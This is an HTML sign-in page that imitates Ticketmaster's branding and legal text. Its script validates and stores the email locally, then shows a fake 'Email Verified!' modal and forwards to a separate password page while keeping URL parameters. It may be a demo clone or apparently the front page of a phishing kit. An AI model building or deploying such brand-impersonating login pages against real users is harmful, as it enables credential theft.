<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign In - Ticketmaster</title>
  <link rel="stylesheet" href="index.css">
  <script>
    // Function to handle form submission
    function handleLogin(event) {
      event.preventDefault();
      console.log('Login form submitted'); // Debug log
      
      // Clear previous errors
      clearErrors();
      
      const email = document.getElementById('email-input').value.trim();
      console.log('Email entered:', email); // Debug log
      
      if (!email) {
        showError('email-input', 'Please enter an email address');
        return;
      }
      
      if (!isValidEmail(email)) {
        showError('email-input', 'Please enter a valid email address');
        return;
      }
      
      // Store email and show success modal
      localStorage.setItem('userEmail', email);
      console.log('Email stored, showing success modal'); // Debug log
      showEmailSuccessModal();
    }
    
    // Helper function to validate email
    function isValidEmail(email) {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return emailRegex.test(email);
    }
    
    // Function to show error below input field
    function showError(fieldId, message) {
      const field = document.getElementById(fieldId);
      const errorDiv = document.getElementById(fieldId + '-error');
      if (errorDiv) {
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
      }
      field.classList.add('error');
    }
    
    // Function to clear all errors
    function clearErrors() {
      const errorElements = document.querySelectorAll('.error-message');
      errorElements.forEach(error => {
        error.style.display = 'none';
      });
      
      const inputFields = document.querySelectorAll('.form-input');
      inputFields.forEach(field => {
        field.classList.remove('error');
      });
    }
    
    // Show email success modal
    function showEmailSuccessModal() {
      const modal = document.getElementById('email-success-modal');
      modal.classList.add('show');
    }
    
    // Close email success modal and go to password page
    function goToPasswordPage() {
      const modal = document.getElementById('email-success-modal');
      modal.classList.remove('show');
      
      // Preserve URL parameters from localStorage
      const preservedParams = localStorage.getItem('preservedUrlParams');
      if (preservedParams) {
        window.location.href = 'password.html?' + preservedParams;
        console.log('Redirecting to password.html with preserved params:', preservedParams);
      } else {
        window.location.href = 'password.html';
      }
    }
    
    // Enable the continue button when email is entered
    function enableContinueButton() {
      const email = document.getElementById('email-input').value;
      const continueBtn = document.getElementById('continue-btn');
      
      console.log('Email input changed:', email); // Debug log
      
      if (email && email.includes('@')) {
        continueBtn.disabled = false;
        continueBtn.classList.remove('disabled');
        continueBtn.classList.add('enabled');
        console.log('Button enabled'); // Debug log
      } else {
        continueBtn.disabled = true;
        continueBtn.classList.add('disabled');
        continueBtn.classList.remove('enabled');
        console.log('Button disabled'); // Debug log
      }
    }
    
    // Handle passkey login
    function handlePasskeyLogin() {
      console.log('Passkey button clicked'); // Debug log
      alert('Passkey login would be implemented here. For demo purposes, redirecting to email login...');
      document.getElementById('email-input').focus();
    }
    
    // Load page when DOM is ready
    document.addEventListener('DOMContentLoaded', function() {
      console.log('DOM loaded, setting up event listeners'); // Debug log
      
      // Store URL parameters if they exist (for direct access to login page)
      const currentUrl = new URL(window.location.href);
      const urlParams = currentUrl.searchParams.toString();
      if (urlParams) {
        localStorage.setItem('preservedUrlParams', urlParams);
        console.log('Stored URL parameters from direct login access:', urlParams);
      }
      
      // Test if elements exist
      console.log('Email input:', document.getElementById('email-input'));
      console.log('Continue button:', document.getElementById('continue-btn'));
      console.log('Passkey button:', document.getElementById('passkey-btn'));
      
      // Add event listener to email input
      const emailInput = document.getElementById('email-input');
      if (emailInput) {
        emailInput.addEventListener('input', enableContinueButton);
        console.log('Email input listener added'); // Debug log
      } else {
        console.error('Email input not found!'); // Debug log
      }
      
      // Add event listener to passkey button
      const passkeyBtn = document.getElementById('passkey-btn');
      if (passkeyBtn) {
        passkeyBtn.addEventListener('click', handlePasskeyLogin);
        console.log('Passkey button listener added'); // Debug log
      } else {
        console.error('Passkey button not found!'); // Debug log
      }
      
      // Add event listener to continue button as backup
      const continueBtn = document.getElementById('continue-btn');
      if (continueBtn) {
        continueBtn.addEventListener('click', function(e) {
          console.log('Continue button clicked directly'); // Debug log
          handleLogin(e);
        });
        console.log('Continue button listener added'); // Debug log
      } else {
        console.error('Continue button not found!'); // Debug log
      }
      
      // Test button clickability
      setTimeout(() => {
        console.log('Testing button states:');
        console.log('Continue button disabled:', continueBtn?.disabled);
        console.log('Continue button classes:', continueBtn?.className);
        console.log('Passkey button disabled:', passkeyBtn?.disabled);
        console.log('Passkey button classes:', passkeyBtn?.className);
      }, 1000);
    });
  </script>
</head>

<body>
  <div class="login-container">
    <!-- Left Column - Welcome Section -->
    <div class="welcome-section">
      <div class="welcome-content">
        <h1 class="welcome-title">WELCOME</h1>
        <div class="welcome-divider"></div>
        <p class="welcome-description">
          Discover millions of events, get alerts about your favorite artists, teams, plays and more â€” plus always- secure, effortless ticketing.
        </p>
        <div class="welcome-logo">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
            <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
          </svg>
        </div>
                          </div>
                        </div>

    <!-- Right Column - Login Form -->
    <div class="login-section">
      <div class="login-content">
        <h2 class="login-title">SIGN IN OR CREATE ACCOUNT</h2>
        <p class="login-subtitle">If you don't have an account you will be prompted to create one.</p>
        
        <form class="login-form" onsubmit="handleLogin(event)">
          <div class="form-group">
            <label for="email-input" class="form-label">Email Address</label>
            <input 
              type="email" 
              id="email-input" 
              name="email" 
              class="form-input" 
              autocomplete="email"
              required
            />
            <div id="email-input-error" class="error-message"></div>
          </div>
          
          <button type="submit" id="continue-btn" class="continue-btn disabled" disabled>
            Continue
          </button>
          
          <div class="signup-section">
            <p class="signup-text">Don't have an account?</p>
            <a href="signup.html" class="signup-link">Sign Up</a>
          </div>
          
          <div class="divider">
            <span class="divider-text">OR</span>
          </div>
          
          <button type="button" id="passkey-btn" class="passkey-btn">
            <svg class="passkey-icon" viewBox="0 0 24 24" width="20" height="20">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
            </svg>
            Sign In With A Passkey
          </button>
          
          <a href="#" class="passkey-help">What's A Passkey?</a>
        </form>
        
        <div class="legal-text">
          <p>
            By continuing past this page, I acknowledge that I have read and agree to the current 
            <a href="https://help.ticketmaster.com/hc/en-us/articles/10468830739345-Terms-of-Use" target="_blank" class="legal-link">Terms of Use</a>, 
            including the arbitration agreement and class action waiver, updated in August 2025, and understand that information will be used as described in our 
            <a href="https://privacy.ticketmaster.com/privacy-policy" target="_blank" class="legal-link">Privacy Policy</a>.
          </p>
          <p>
            As set forth in our Privacy Policy, we may use your information for email marketing, including promotions and updates on our own or third-party products. You can opt out of our marketing emails anytime.
          </p>
        </div>
      </div>
    </div>
  </div>

  <!-- Email Success Modal -->
  <div id="email-success-modal" class="success-modal">
    <div class="success-modal-content">
      <div class="success-icon">ðŸ“§</div>
      <h3 class="success-title">Email Verified!</h3>
      <p class="success-message">Great! Now please enter your password to complete the sign-in process.</p>
      <button onclick="goToPasswordPage()" class="success-button">Continue to Password</button>
    </div>
  </div>
</body>

</html>